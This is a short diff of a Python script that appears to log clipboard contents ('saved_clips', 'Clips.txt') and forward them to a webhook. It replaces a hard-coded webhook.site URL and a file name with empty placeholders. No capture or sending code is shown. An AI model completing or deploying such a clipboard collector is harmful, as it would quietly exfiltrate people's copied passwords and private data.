@@ -3,11 +3,11 @@ import time
 import requests
 
 saved_clips = []
-filename = 'Clips.txt'
+filename = "" # <--- name of your text file where all your data would be stored
 interval = 1
 save_interval = 5
 delete_interval = 5
-webhook_url = 'https://webhook.site/471bf52a-5a61-4ec1-9f01-3cb4db8ac03e'
+webhook_url = ""  # <--- your webhook url
 
 def erase_file():
     with open(filename, 'w') as file:
